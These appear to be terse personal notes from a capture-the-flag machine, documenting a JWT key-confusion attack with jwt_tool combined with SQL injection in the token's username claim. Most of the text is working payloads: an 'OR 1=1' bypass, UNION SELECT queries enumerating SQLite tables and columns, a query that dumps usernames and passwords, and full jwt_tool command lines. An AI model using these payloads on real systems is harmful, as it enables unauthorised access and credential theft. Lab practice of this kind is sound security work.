Possible vulns: 

* User Agent manuipulation
* SQL injection
* Command Injection
* Hidden file path traversal

* Checking JWT: using public key in JWT => not goot practise: checking...

Encoding is: UTF-8 of body requests, 

SQL injection in JWT: 

Works: `yolo' OR 1=1 --`
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImUiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MTc2NDM1MTB9.V-NBwTMcHFDWbxbmTm6kaIYHBOtjPUhqfj_i17GD3rd9FacVA4j1TW8cFyPUGEXFOEV5Y2cJNrjnvgV_yJJI1-m3VQGjz07PsbbHAZwZOuA83jWF9DII78oUgRP4LOBfHy2jqdt0OVLQbQo5rpygc7zIwfChwhKLHIHxJN0hUQW4Oq4gQkO6Z_-5gBe6RVXC_JBR6QG8Tt9aywq8QbRaAv-H4ygsATy_o9LJa0c_JqVmijFdIMtMtknRyg00V775XLykV4P4H_UXXQ07BIqcdDt5Zzm1hXG2gZglHhD7A6CbsYP9aiXOxHyDLMHKEdKRHflkYrntYgRBBwmI_HqcGw -I -pc username -pv "yolo' OR 1=1 --" -X k -pk ~/Documents/machines/underConstructions/publicKey.txt

## Verfiy columns for union

* 3 columns in users
* All 3 String values
* one column = `id`, `password`, `username`
* Getting column headlines: `' UNION SELECT name,name,name FROM PRAGMA_TABLE_INFO('users') WHERE name != 'id' AND name != 'password' --`
* Derived users and pws by: `"' UNION SELECT password || ',' || username,password || ',' || username,password || ',' || username FROM users WHERE id= '1' --"`
* users: user/user, 
* getting tables via: `"' UNION SELECT name,name,name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_' --"`
* flag: `flag_storage' headlines: id,top_secret_flaag

python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImUiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MTc2ODQ3MjN9.ETOVbMvqoxqGR-iP01C3ZmI2W8hR5r7kTv1VTexdYR_cFJlBu_ccUJmLdhdF477qM-TdtaqFFF4YKvz7fck4-tpKdG1TrzcV_rOm-l-zRIr_uW3vwsHJNdiHShAwjQwP9VDLpLbaLpLOgAB7h4nncS2O5PhaHF53ggE9tFUeATfzpelA02qyLbMXSniNyqGRae-xBfAPmyRmDWowQXcZ4l-_dcP8125Lfy3ZBHkjeo4jVwicBwiPkGwh-TijFTm2K-wfjT_QGoHEvcKTdnrvjHnl7Pm4INecFq8hlYOBH8YSWLC_lE9VuPkOpXNtELfQCMV61weGMGOSlP6Ba1vraw -I -pc username -pv "' UNION SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_' --" -X k -pk ~/Documents/machines/underConstructions/publicKey.txt

